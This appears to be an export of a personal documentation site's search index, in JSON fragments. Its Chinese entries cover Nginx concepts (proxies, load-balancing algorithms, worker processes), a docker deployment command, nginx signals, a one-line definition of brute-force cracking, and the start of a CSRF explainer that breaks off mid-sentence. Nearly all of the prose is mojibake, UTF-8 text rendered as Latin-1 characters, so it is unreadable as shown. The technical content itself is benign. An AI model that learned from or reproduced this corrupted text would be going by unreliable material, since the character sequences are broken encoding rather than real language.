æœ¬æ–‡æä¾›äº†Nginxçš„åŸºæœ¬æ¦‚å¿µåŠçŸ¥è¯†ã€‚ä»¥å¼€å‘è€…å¿…å¤‡çš„NginxåŸºç¡€çŸ¥è¯†ä¸ºä¸»ï¼Œç½—åˆ—äº†ä¸€äº›Nginxæ•™ç¨‹ï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ã€‚ Nginxçš„äº§ç”Ÿ Nginx åŒ Apache ä¸€æ ·éƒ½æ˜¯ä¸€ç§ Web æœåŠ¡å™¨ã€‚ åŸºäº REST æ¶æ„é£æ ¼ï¼Œä»¥ç»Ÿä¸€èµ„æºæè¿°ç¬¦ï¼ˆUniform Resources Identifierï¼‰URI æˆ–è€…ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆUniform Resources Locatorï¼‰URL ä½œä¸ºæ²Ÿé€šä¾æ®ï¼Œé€šè¿‡ HTTP åè®®æä¾›å„ç§ç½‘ç»œæœåŠ¡ã€‚ ç„¶è€Œï¼Œè¿™äº›æœåŠ¡å™¨åœ¨è®¾è®¡ä¹‹åˆå—åˆ°å½“æ—¶ç¯å¢ƒçš„å±€é™ï¼Œ ä¾‹å¦‚å½“æ—¶çš„ç”¨æˆ·è§„æ¨¡ï¼Œç½‘ç»œå¸¦å®½ï¼Œäº§å“ç‰¹ç‚¹ç­‰å±€é™å¹¶ä¸”å„è‡ªçš„å®šä½å’Œå‘å±•éƒ½ä¸å°½ç›¸åŒã€‚ è¿™ä¹Ÿä½¿å¾—å„ä¸ª Web æœåŠ¡å™¨æœ‰ç€å„è‡ªé²œæ˜çš„ç‰¹ç‚¹ã€‚ Apache çš„å‘å±•æ—¶æœŸå¾ˆé•¿ï¼Œè€Œä¸”æ˜¯æ¯«æ— äº‰è®®çš„ä¸–ç•Œç¬¬ä¸€å¤§æœåŠ¡å™¨ã€‚å®ƒæœ‰ç€å¾ˆå¤šä¼˜ç‚¹ï¼šç¨³å®šã€å¼€æºã€è·¨å¹³å°ç­‰ç­‰ã€‚ å®ƒå‡ºç°çš„æ—¶é—´å¤ªé•¿äº†ï¼Œå®ƒå…´èµ·çš„å¹´ä»£ï¼Œäº’è”ç½‘äº§ä¸šè¿œè¿œæ¯”ä¸ä¸Šç°åœ¨ã€‚æ‰€ä»¥å®ƒè¢«è®¾è®¡ä¸ºä¸€ä¸ªé‡é‡çº§çš„ã€‚ å®ƒä¸æ”¯æŒé«˜å¹¶å‘çš„æœåŠ¡å™¨ã€‚åœ¨ Apache ä¸Šè¿è¡Œæ•°ä»¥ä¸‡è®¡çš„å¹¶å‘è®¿é—®ï¼Œä¼šå¯¼è‡´æœåŠ¡å™¨æ¶ˆè€—å¤§é‡å†…å­˜ã€‚ æ“ä½œç³»ç»Ÿå¯¹å…¶è¿›è¡Œè¿›ç¨‹æˆ–çº¿ç¨‹é—´çš„åˆ‡æ¢ä¹Ÿæ¶ˆè€—äº†å¤§é‡çš„ CPU èµ„æºï¼Œå¯¼è‡´ HTTP è¯·æ±‚çš„å¹³å‡å“åº”é€Ÿåº¦é™ä½ã€‚ è¿™äº›éƒ½å†³å®šäº† Apache ä¸å¯èƒ½æˆä¸ºé«˜æ€§èƒ½ Web æœåŠ¡å™¨ï¼Œè½»é‡çº§é«˜å¹¶å‘æœåŠ¡å™¨ Nginx å°±åº”è¿è€Œç”Ÿäº†ã€‚ ä¿„ç½—æ–¯çš„å·¥ç¨‹å¸ˆ Igor Sysoevï¼Œä»–åœ¨ä¸º Rambler Media å·¥ä½œæœŸé—´ï¼Œä½¿ç”¨ C è¯­è¨€å¼€å‘äº† Nginxã€‚ Nginx ä½œä¸º Web æœåŠ¡å™¨ä¸€ç›´ä¸º Rambler Media æä¾›å‡ºè‰²è€Œåˆç¨³å®šçš„æœåŠ¡ã€‚ç„¶åå‘¢ï¼ŒIgor Sysoev å°† Nginx ä»£ç å¼€æºï¼Œå¹¶ä¸”èµ‹äºˆè‡ªç”±è½¯ä»¶è®¸å¯è¯ã€‚ ç”±äºä»¥ä¸‹è¿™å‡ ç‚¹ï¼Œæ‰€ä»¥ï¼ŒNginx ç«äº† Nginx ä½¿ç”¨åŸºäºäº‹ä»¶é©±åŠ¨æ¶æ„ï¼Œä½¿å¾—å…¶å¯ä»¥æ”¯æŒæ•°ä»¥ç™¾ä¸‡çº§åˆ«çš„ TCP è¿æ¥ã€‚ é«˜åº¦çš„æ¨¡å—åŒ–å’Œè‡ªç”±è½¯ä»¶è®¸å¯è¯ä½¿å¾—ç¬¬ä¸‰æ–¹æ¨¡å—å±‚å‡ºä¸ç©·ï¼ˆè¿™æ˜¯ä¸ªå¼€æºçš„æ—¶ä»£å•Šï¼‰ã€‚ Nginx æ˜¯ä¸€ä¸ªè·¨å¹³å°æœåŠ¡å™¨ï¼Œå¯ä»¥è¿è¡Œåœ¨ Linuxã€Windowsã€FreeBSDã€Solarisã€AIXã€Mac OS ç­‰æ“ä½œç³»ç»Ÿä¸Šã€‚ è¿™äº›ä¼˜ç§€çš„è®¾è®¡å¸¦æ¥çš„æå¤§çš„ç¨³å®šæ€§ã€‚ Nginx åŸºæœ¬æ¦‚å¿µ æ­£å‘ä»£ç†ä¸åå‘ä»£ç† ä¸ºäº†ä¾¿äºç†è§£ï¼Œé¦–å…ˆå…ˆæ¥äº†è§£ä¸€ä¸‹ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œnginxæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„åå‘ä»£ç†æœåŠ¡å™¨é‚£ä¹ˆä»€ä¹ˆæ˜¯åå‘ä»£ç†å‘¢ï¼Ÿ ä»£ç†æ˜¯åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´å‡è®¾çš„ä¸€å±‚æœåŠ¡å™¨ï¼Œä»£ç†å°†æ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚å¹¶å°†å®ƒè½¬å‘ç»™æœåŠ¡å™¨ï¼Œç„¶åå°†æœåŠ¡ç«¯çš„å“åº”è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚ ä¸ç®¡æ˜¯æ­£å‘ä»£ç†è¿˜æ˜¯åå‘ä»£ç†ï¼Œå®ç°çš„éƒ½æ˜¯ä¸Šé¢çš„åŠŸèƒ½ã€‚ å¦‚æœå¯¹OSI ä¸ƒå±‚æ¨¡å‹ä¸ TCP/IP å››å±‚æ¨¡å‹ä¸æ˜¯å¾ˆç†Ÿæ‚‰å¯ä»¥å†å›é¡¾ä¸‹ æ­£å‘ä»£ç† æ­£å‘ä»£ç†ï¼ˆforwardï¼‰æ„æ€æ˜¯ä¸€ä¸ªä½äºå®¢æˆ·ç«¯å’ŒåŸå§‹æœåŠ¡å™¨ (origin server) ä¹‹é—´çš„æœåŠ¡å™¨ï¼Œ ä¸ºäº†ä»åŸå§‹æœåŠ¡å™¨å–å¾—å†…å®¹ï¼Œå®¢æˆ·ç«¯å‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚å¹¶æŒ‡å®šç›®æ ‡ (åŸå§‹æœåŠ¡å™¨)ï¼Œ ç„¶åä»£ç†å‘åŸå§‹æœåŠ¡å™¨è½¬äº¤è¯·æ±‚å¹¶å°†è·å¾—çš„å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ æ­£å‘ä»£ç†æ˜¯ä¸ºæˆ‘ä»¬æœåŠ¡çš„ï¼Œå³ä¸ºå®¢æˆ·ç«¯æœåŠ¡çš„ï¼Œå®¢æˆ·ç«¯å¯ä»¥æ ¹æ®æ­£å‘ä»£ç†è®¿é—®åˆ°å®ƒæœ¬èº«æ— æ³•è®¿é—®åˆ°çš„æœåŠ¡å™¨èµ„æºã€‚ æ­£å‘ä»£ç†å¯¹æˆ‘ä»¬æ˜¯é€æ˜çš„ï¼Œå¯¹æœåŠ¡ç«¯æ˜¯éé€æ˜çš„ï¼Œå³æœåŠ¡ç«¯å¹¶ä¸çŸ¥é“è‡ªå·±æ”¶åˆ°çš„æ˜¯æ¥è‡ªä»£ç†çš„è®¿é—®è¿˜æ˜¯æ¥è‡ªçœŸå®å®¢æˆ·ç«¯çš„è®¿é—®ã€‚ åå‘ä»£ç† åå‘ä»£ç†ï¼ˆReverse Proxyï¼‰æ–¹å¼æ˜¯æŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æ¥å— internet ä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œ ç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™ internet ä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œ æ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–å°±è¡¨ç°ä¸ºä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ã€‚ åå‘ä»£ç†æ˜¯ä¸ºæœåŠ¡ç«¯æœåŠ¡çš„ï¼Œåå‘ä»£ç†å¯ä»¥å¸®åŠ©æœåŠ¡å™¨æ¥æ”¶æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¸®åŠ©æœåŠ¡å™¨åšè¯·æ±‚è½¬å‘ï¼Œè´Ÿè½½å‡è¡¡ç­‰ã€‚ åå‘ä»£ç†å¯¹æœåŠ¡ç«¯æ˜¯é€æ˜çš„ï¼Œå¯¹æˆ‘ä»¬æ˜¯éé€æ˜çš„ï¼Œå³æˆ‘ä»¬å¹¶ä¸çŸ¥é“è‡ªå·±è®¿é—®çš„æ˜¯ä»£ç†æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨çŸ¥é“åå‘ä»£ç†åœ¨ä¸ºä»–æœåŠ¡ã€‚ è´Ÿè½½å‡è¡¡ å¦‚æœè¯·æ±‚æ•°è¿‡å¤§ï¼Œå•ä¸ªæœåŠ¡å™¨è§£å†³ä¸äº†ï¼Œæˆ‘ä»¬å¢åŠ æœåŠ¡å™¨çš„æ•°é‡ï¼Œç„¶åå°†è¯·æ±‚åˆ†å‘åˆ°å„ä¸ªæœåŠ¡å™¨ä¸Šï¼Œ å°†åŸå…ˆè¯·æ±‚é›†ä¸­åˆ°å•ä¸ªæœåŠ¡å™¨çš„æƒ…å†µæ”¹ä¸ºè¯·æ±‚åˆ†å‘åˆ°å¤šä¸ªæœåŠ¡å™¨ä¸Šï¼Œå°±æ˜¯è´Ÿè½½å‡è¡¡ã€‚ Upstream æŒ‡å®šåç«¯æœåŠ¡å™¨åœ°å€åˆ—è¡¨ï¼Œåœ¨ server ä¸­æ‹¦æˆªå“åº”è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘åˆ° Upstream ä¸­é…ç½®çš„æœåŠ¡å™¨åˆ—è¡¨: upstream balanceServer { server 10.1.22.33:12345; server 10.1.22.34:12345; server 10.1.22.35:12345; } server { server_name fe.server.com; listen 80; location /api { proxy_pass http://balanceServer; } } ä¸Šé¢çš„é…ç½®åªæ˜¯æŒ‡å®šäº† nginx éœ€è¦è½¬å‘çš„æœåŠ¡ç«¯åˆ—è¡¨ï¼Œå¹¶æ²¡æœ‰æŒ‡å®šåˆ†é…ç­–ç•¥ã€‚ é»˜è®¤æƒ…å†µä¸‹é‡‡ç”¨çš„æ˜¯è½®è¯¢ç­–ç•¥ï¼Œå°†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚è½®è¯¢åˆ†é…ç»™æœåŠ¡ç«¯ã€‚ è¿™ç§ç­–ç•¥æ˜¯å¯ä»¥æ­£å¸¸å·¥ä½œçš„ï¼Œä½†æ˜¯å¦‚æœå…¶ä¸­æŸä¸€å°æœåŠ¡å™¨å‹åŠ›å¤ªå¤§ï¼Œå‡ºç°å»¶è¿Ÿï¼Œä¼šå½±å“æ‰€æœ‰åˆ†é…åœ¨è¿™å°æœåŠ¡å™¨ä¸‹çš„ç”¨æˆ·ã€‚ Nginxæ”¯æŒçš„è´Ÿè½½å‡è¡¡è°ƒåº¦ç®—æ³• weightè½®è¯¢(é»˜è®¤ï¼Œå¸¸ç”¨) æ¥æ”¶åˆ°çš„è¯·æ±‚æŒ‰ç…§æƒé‡åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œ å³ä½¿åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼ŒæŸä¸€å°åç«¯æœåŠ¡å™¨å®•æœºï¼ŒNginxä¼šè‡ªåŠ¨å°†è¯¥æœåŠ¡å™¨å‰”é™¤å‡ºé˜Ÿåˆ—ï¼Œ è¯·æ±‚å—ç†æƒ…å†µä¸ä¼šå—åˆ°ä»»ä½•å½±å“ã€‚è¿™ç§æ–¹å¼ä¸‹ï¼Œ å¯ä»¥ç»™ä¸åŒçš„åç«¯æœåŠ¡å™¨è®¾ç½®ä¸€ä¸ªæƒé‡å€¼(weight)ï¼Œç”¨äºè°ƒæ•´ä¸åŒçš„æœåŠ¡å™¨ä¸Šè¯·æ±‚çš„åˆ†é…ç‡ï¼› æƒé‡æ•°æ®è¶Šå¤§ï¼Œè¢«åˆ†é…åˆ°è¯·æ±‚çš„å‡ ç‡è¶Šå¤§ï¼› è¯¥æƒé‡å€¼ï¼Œä¸»è¦æ˜¯é’ˆå¯¹å®é™…å·¥ä½œç¯å¢ƒä¸­ä¸åŒçš„åç«¯æœåŠ¡å™¨ç¡¬ä»¶é…ç½®è¿›è¡Œè°ƒæ•´çš„ã€‚ ip_hashï¼ˆå¸¸ç”¨ï¼‰ æ¯ä¸ªè¯·æ±‚æŒ‰ç…§å‘èµ·å®¢æˆ·ç«¯çš„ipçš„hashç»“æœè¿›è¡ŒåŒ¹é…ï¼Œ è¿™æ ·çš„ç®—æ³•ä¸‹ä¸€ä¸ªå›ºå®šipåœ°å€çš„å®¢æˆ·ç«¯æ€»ä¼šè®¿é—®åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œ è¿™ä¹Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†é›†ç¾¤éƒ¨ç½²ç¯å¢ƒä¸‹sessionå…±äº«çš„é—®é¢˜ã€‚ fair æ™ºèƒ½è°ƒæ•´è°ƒåº¦ç®—æ³•ï¼ŒåŠ¨æ€çš„æ ¹æ®åç«¯æœåŠ¡å™¨çš„è¯·æ±‚å¤„ç†åˆ°å“åº”çš„æ—¶é—´è¿›è¡Œå‡è¡¡åˆ†é…ï¼Œ å“åº”æ—¶é—´çŸ­å¤„ç†æ•ˆç‡é«˜çš„æœåŠ¡å™¨åˆ†é…åˆ°è¯·æ±‚çš„æ¦‚ç‡é«˜ï¼Œå“åº”æ—¶é—´é•¿å¤„ç†æ•ˆç‡ä½çš„æœåŠ¡å™¨åˆ†é…åˆ°çš„è¯·æ±‚å°‘ï¼› ç»“åˆäº†å‰ä¸¤è€…çš„ä¼˜ç‚¹çš„ä¸€ç§è°ƒåº¦ç®—æ³•ã€‚ ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯Nginxé»˜è®¤ä¸æ”¯æŒfairç®—æ³•ï¼Œå¦‚æœè¦ä½¿ç”¨è¿™ç§è°ƒåº¦ç®—æ³•ï¼Œ è¯·å®‰è£…upstream_fairæ¨¡å—ã€‚ url_hash æŒ‰ç…§è®¿é—®çš„urlçš„hashç»“æœåˆ†é…è¯·æ±‚ï¼Œæ¯ä¸ªè¯·æ±‚çš„urlä¼šæŒ‡å‘åç«¯å›ºå®šçš„æŸä¸ªæœåŠ¡å™¨ï¼Œ å¯ä»¥åœ¨Nginxä½œä¸ºé™æ€æœåŠ¡å™¨çš„æƒ…å†µä¸‹æé«˜ç¼“å­˜æ•ˆç‡ã€‚ åŒæ ·è¦æ³¨æ„Nginxé»˜è®¤ä¸æ”¯æŒè¿™ç§è°ƒåº¦ç®—æ³•ï¼Œè¦ä½¿ç”¨çš„è¯éœ€è¦å®‰è£…Nginxçš„hashè½¯ä»¶åŒ…ã€‚ åŠ¨é™åˆ†ç¦» ä¸ºäº†åŠ å¿«æœåŠ¡å™¨çš„è§£æé€Ÿåº¦ï¼Œå¯ä»¥æŠŠåŠ¨æ€é¡µé¢å’Œé™æ€é¡µé¢äº¤ç»™ä¸åŒçš„æœåŠ¡å™¨æ¥è§£æï¼ŒåŠ å¿«è§£æé€Ÿåº¦ï¼Œé™ä½åŸæ¥å•ä¸ªæœåŠ¡å™¨çš„å‹åŠ›ã€‚ Master å’Œ Worker è¿›ç¨‹ NginxåŒ…å«ä¸€ä¸ª`master`è¿›ç¨‹å’Œä¸€åˆ°å¤šä¸ª`worker`è¿›ç¨‹ã€‚å¦‚æœé…ç½®äº†`ç¼“å­˜`çš„è¯ï¼Œè¿˜å°†åŒ…å«`ç¼“å­˜åŠ è½½è¿›ç¨‹`å’Œ`ç¼“å­˜ç®¡ç†è¿›ç¨‹`ã€‚ master è¿›ç¨‹ä¸»è¦è´Ÿè´£è¯»å–é…ç½®æ–‡ä»¶ï¼Œå¹¶æ§åˆ¶ç®¡ç†`workder`è¿›ç¨‹ã€‚ worker è¿›ç¨‹è´Ÿè´£å¤„ç†è¯·æ±‚ã€‚NginxåŸºäºæ“ä½œç³»ç»Ÿçš„è°ƒåº¦æœºåˆ¶é«˜æ•ˆåœ°åœ¨`worker`è¿›ç¨‹é—´åˆ†é…è¯·æ±‚ã€‚å¯ä»¥åœ¨`nginx.conf`é…ç½®æ–‡ä»¶ä¸­è®¾ç½®`worker`è¿›ç¨‹çš„æ•°é‡ï¼Œä¸€èˆ¬è®¾ç½®ä¸ºæœåŠ¡å™¨çš„CPUå†…æ ¸æ•°ã€‚ ä¸ºä»€ä¹ˆé€‰æ‹©Nginx Nginxæ˜¯ä¸€æ¬¾è‡ªç”±çš„ã€å¼€æºçš„ã€é«˜æ€§èƒ½çš„HTTPæœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼› åŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªIMAPã€POP3ã€SMTPä»£ç†æœåŠ¡å™¨ï¼› Nginxå¯ä»¥ä½œä¸ºä¸€ä¸ªHTTPæœåŠ¡å™¨è¿›è¡Œç½‘ç«™çš„å‘å¸ƒå¤„ç†ï¼Œ å¦å¤–Nginxå¯ä»¥ä½œä¸ºåå‘ä»£ç†è¿›è¡Œè´Ÿè½½å‡è¡¡çš„å®ç°ã€‚åœ¨Nginxç½‘ç«™ä¸Šï¼Œå…¶åŠŸèƒ½åŒ…æ‹¬ï¼š HTTPå’ŒHTTPSï¼ˆTLS / SSL / SNIï¼‰ è¶…å¿«é€Ÿçš„WebæœåŠ¡å™¨ç”¨äºé™æ€å†…å®¹ FastCGIï¼ŒWSGIï¼ŒSCGIç”¨äºåŠ¨æ€å†…å®¹ å…·æœ‰è´Ÿè½½å¹³è¡¡å’Œç¼“å­˜åŠŸèƒ½çš„åŠ é€ŸWebä»£ç† ä¸é—´æ–­å®æ—¶äºŒè¿›åˆ¶å‡çº§å’Œé…ç½® å‹ç¼©å’Œå†…å®¹è¿‡æ»¤å™¨ è™šæ‹Ÿä¸»æœº FLVå’ŒMP4çš„åª’ä½“æµ å¸¦å®½å’Œè¿æ¥ç­–ç•¥ å…¨é¢çš„è®¿é—®æ§åˆ¶ è‡ªå®šä¹‰æ—¥å¿— åµŒå…¥å¼è„šæœ¬ å¸¦æœ‰TLSçš„SMTP / IMAP / POP3çš„é‚®ä»¶ä»£ç† é€»è¾‘ï¼Œçµæ´»ï¼Œå¯æ‰©å±•çš„é…ç½® åœ¨Linuxï¼ŒFreeBSDï¼ŒMac OS Xï¼ŒSolariså’ŒWindowsä¸Šè¿è¡Œ Nginxæœ‰å¦‚ä¸‹ä¼˜åŠ¿ IOå¤šè·¯å¤ç”¨epollï¼ˆIOå¤ç”¨ï¼‰ å¦‚ä½•ç†è§£å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­å§ï¼ æœ‰Aã€Bã€Cä¸‰ä¸ªè€å¸ˆï¼Œä»–ä»¬éƒ½é‡åˆ°ä¸€ä¸ªéš¾é¢˜ï¼Œè¦å¸®åŠ©ä¸€ä¸ªç­çº§çš„å­¦ç”Ÿè§£å†³è¯¾å ‚ä½œä¸šã€‚ è€å¸ˆAé‡‡ç”¨ä»ç¬¬ä¸€æ’å¼€å§‹ä¸€ä¸ªå­¦ç”Ÿä¸€ä¸ªå­¦ç”Ÿè½®æµè§£ç­”çš„æ–¹å¼å»å›ç­”é—®é¢˜ï¼Œ è€å¸ˆAæµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œå¹¶ä¸”æœ‰çš„å­¦ç”Ÿä½œä¸šè¿˜æ²¡æœ‰å®Œæˆå‘¢ï¼Œè€å¸ˆå°±æ¥äº†ï¼Œååå¤å¤æ•ˆç‡ææ…¢ã€‚ è€å¸ˆBæ˜¯ä¸€ä¸ªå¿è€…ï¼Œä»–å‘ç°è€å¸ˆAçš„æ–¹æ³•è¡Œä¸é€šï¼Œäºæ˜¯ä»–ä½¿ç”¨äº†å½±åˆ†èº«æœ¯ï¼Œåˆ†èº«å‡ºå¥½å‡ ä¸ªè‡ªå·±åŒä¸€æ—¶é—´å»å¸®å¥½å‡ ä¸ª åŒå­¦å›ç­”é—®é¢˜ï¼Œæœ€åè¿˜æ²¡å›ç­”å®Œï¼Œè€å¸ˆBæ¶ˆè€—å…‰äº†èƒ½é‡ç´¯å€’äº†ã€‚ è€å¸ˆCæ¯”è¾ƒç²¾æ˜ï¼Œä»–å‘Šè¯‰å­¦ç”Ÿï¼Œè°å®Œæˆäº†ä½œä¸šä¸¾æ‰‹ï¼Œæœ‰ä¸¾æ‰‹çš„åŒå­¦ä»–æ‰å»æŒ‡å¯¼é—®é¢˜ï¼Œ ä»–è®©å­¦ç”Ÿä¸»åŠ¨å‘å£°ï¼Œåˆ†å¼€äº†\"å¹¶å‘\"ã€‚è¿™ä¸ªè€å¸ˆCå°±æ˜¯Nginxã€‚ è½»é‡çº§ åŠŸèƒ½æ¨¡å—å°‘ - Nginxä»…ä¿ç•™äº†HTTPéœ€è¦çš„æ¨¡å—ï¼Œå…¶ä»–éƒ½ç”¨æ’ä»¶çš„æ–¹å¼ï¼Œåå¤©æ·»åŠ  ä»£ç æ¨¡å—åŒ– - æ›´é€‚åˆäºŒæ¬¡å¼€å‘ï¼Œå¦‚é˜¿é‡Œå·´å·´Tengine CPUäº²å’Œ æŠŠCPUæ ¸å¿ƒå’ŒNginxå·¥ä½œè¿›ç¨‹ç»‘å®šï¼ŒæŠŠæ¯ä¸ªworkerè¿›ç¨‹å›ºå®šåœ¨ä¸€ä¸ªCPUä¸Šæ‰§è¡Œï¼Œå‡å°‘åˆ‡æ¢CPUçš„cache missï¼Œä»è€Œæé«˜æ€§èƒ½ã€‚","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-nginx-Detailed-concept.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-Detailed-concept.html"},{"title":"dockeréƒ¨ç½²nginx","text":"å¤§æ¦‚æŒ‡ä»¤: docker pull nginx docker run --name mynginx -d -p 80:80 -v /Users/yanque/project/new_doc_rst/build/html:/usr/share/nginx/html nginx é¦–å…ˆæœ¬åœ°ç›®å½•è¦æœ‰htmlé¡¹ç›®, æˆ‘çš„åœ¨ /Users/yanque/project/new_doc_rst/build/html , æ˜ å°„ä¸Šå». ç„¶åæœ¬åœ°æ‰“å¼€ localhostè®¿é—®å³å¯, å±€åŸŸç½‘å†…å¯ç”¨å†…ç½‘ipæ‰“å¼€.","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-nginx-docker-deploy-nginx.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-docker-deploy-nginx.html"},{"title":"æŒ‡ä»¤","text":"è¯­æ³•: nginx -s signal signalæ”¯æŒçš„ stop: å¿«é€Ÿåœæ­¢ quit: ä¼˜é›…ç»ˆæ­¢(ä¼šç­‰å¾…workerå®Œæˆæ‰€æœ‰è¯·æ±‚); ä¹Ÿæ”¯æŒä½¿ç”¨ç³»ç»Ÿçš„killå‘é€: kill -s QUIT nginxçš„pid é»˜è®¤æƒ…å†µä¸‹, pidæ–‡ä»¶ nginx.pid åœ¨ä»¥ä¸‹ç›®å½•: /usr/local/nginx/logs /var/run reload: é‡è½½é…ç½®æ–‡ä»¶; å½“masteræ”¶åˆ°è¿™ä¸ªä¿¡å·çš„æ—¶å€™, ä¼šå…ˆæ£€æŸ¥é…ç½®æ–‡ä»¶æœ‰æ²¡æœ‰è¯­æ³•é—®é¢˜, æ²¡æœ‰çš„è¯, ç»™æ­£åœ¨è¿è¡Œçš„workerå‘é€ç»ˆæ­¢ä¿¡å·(ç›¸å½“äºquit), å¹¶å¯åŠ¨æ–°çš„worker; reopen: é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-nginx-instruction.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-instruction.html"},{"title":"å®‰å…¨é¢†åŸŸçš„AI-æ€è€ƒ","text":"é€›V2çœ‹åˆ°çš„: https://mp.weixin.qq.com/s/q1i_VpNaxxmokutayI-i_g","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-AI-in-the-field-of-security.html","loc":"/yq-doc-source-docs-Safety-AI-in-the-field-of-security.html"},{"title":"æš´åŠ›ç ´è§£","text":"ä¸€èˆ¬é’ˆå¯¹å¯†ç è€Œè¨€ï¼Œ å¼±å¯†ç ï¼ˆWeak Passwordï¼‰å¾ˆå®¹æ˜“è¢«åˆ«äººï¼ˆå¯¹ä½ å¾ˆäº†è§£çš„äººç­‰ï¼‰çŒœåˆ°æˆ–è¢«ç ´è§£å·¥å…·æš´åŠ›ç ´è§£ã€‚","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Common-loopholes-Bandage-crack.html","loc":"/yq-doc-source-docs-Safety-Common-loopholes-Bandage-crack.html"},{"title":"CSRFæ”»å‡»","text":"CSRFæ”»å‡»ï¼Œå…¨ç§°æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼‰ï¼Œ å®ƒå¯ä»¥åˆ©ç”¨ç”¨æˆ·å·²ç™»å½•çš„èº«ä»½ï¼Œåœ¨ç”¨æˆ·æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œä»¥ç”¨æˆ·çš„åä¹‰å®Œæˆéæ³•æ“ä½œã€‚ ä¾‹å­ ç»å¤§å¤šæ•°90ï¼Œ00åéƒ½é‡åˆ°è¿‡CSRFæ”»å‡»ï¼Œå…·ä½“CSRFæ”»å‡»æ˜¯ä»€ä¹ˆï¼Ÿ è®°å¾—ä¸Šåˆä¸­çš„æ—¶å€™ï¼ŒQQç©ºé—´ç»å¸¸ä¼šçœ‹åˆ°è¿™æ ·çš„è¯´è¯´: \"ä»Šå¤©æ˜¯é©¬åŒ–è…¾çš„ç”Ÿæ—¥ï¼Œè½¬å‘è¿™æ¡è¯´è¯´åˆ°10ä¸ªç¾¤å…è´¹èµ é€ä¸€ä¸ªæœˆVIPã€‚\" \"è½¬å‘è¿™æ¡è¯´è¯´ï¼Œå…è´¹é¢†å–ä¸€å¹´é»„é’»/çº¢é’»/è“é’»/ç²‰é’»ã€‚\" \"å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯æ˜“çƒŠåƒçºï¼Œè¿™æ˜¯æˆ‘çš„QQå·*********ï¼Œæ¬¢è¿å„ä½å°ä¼™ä¼´åŠ æˆ‘QQã€‚\" ä¸Šå¤§å­¦åï¼ŒQQé‚®ç®±åˆä¼šæ”¶åˆ°è¿™æ ·çš„é‚®ä»¶: å‘ä»¶äººï¼š\"æ•™åŠ¡å¤„\" å†…å®¹ä¸ºï¼š\"##å¤§å­¦##ç³»2022å¹´ä¸Šå­¦æœŸæœŸæœ«è€ƒè¯•æˆç»©å•\"æˆ–è€…\"##å¤§å­¦2022å¹´ä¸‹å­¦æœŸè¯¾ç¨‹å®‰æ’\"ç­‰ï¼Œè¿™äº›é‚®ä»¶ä¸­è¿˜å¾ˆé»˜å¥‘çš„éƒ½æ”¾ä¸€ä¸ªé“¾æ¥ å³ä¾¿æ˜¯ç°åœ¨ï¼Œç©QQçš„éƒ½é‡åˆ°è¿‡ï¼Œè«åå…¶å¦™çš„æ”¶åˆ°é™Œç”Ÿäººå‘æ¥çš„ä¸€ä»½åœ¨çº¿å…±äº«æ–‡æ¡£ï¼Œ å†…å®¹ä¸ºï¼š\"##å¹´ä¸‹åŠå¹´å››å…­çº§æˆç»©æŠ¥å‘Š\"ï¼› è¿˜æœ‰ä½ QQåˆ—è¡¨ä¸­é‚£äº›è¢«ç›—å·çš„æœ‹å‹æ˜¯ä¸æ˜¯æ€»ä¼šå‘äº›é“¾æ¥ç»™ä½ ï¼Œç‚¹å¼€ä»¥åå‘ç°æ‰‹æœºå¡æ­»äº†ã€‚ è¿‘å‡ å¹´æ–°é—»æŠ¥é“çš„é“¾æ¥è¯ˆéª—æ•°ä¸èƒœæ•°ï¼Œå®¶é‡Œçš„çˆ·çˆ·å¥¶å¥¶ï¼Œçˆ¸çˆ¸å¦ˆå¦ˆï¼Œ ç”šè‡³ä¸ƒå¤§å§‘å…«å¤§å§¨å¾®ä¿¡å‘ç»™ä½ 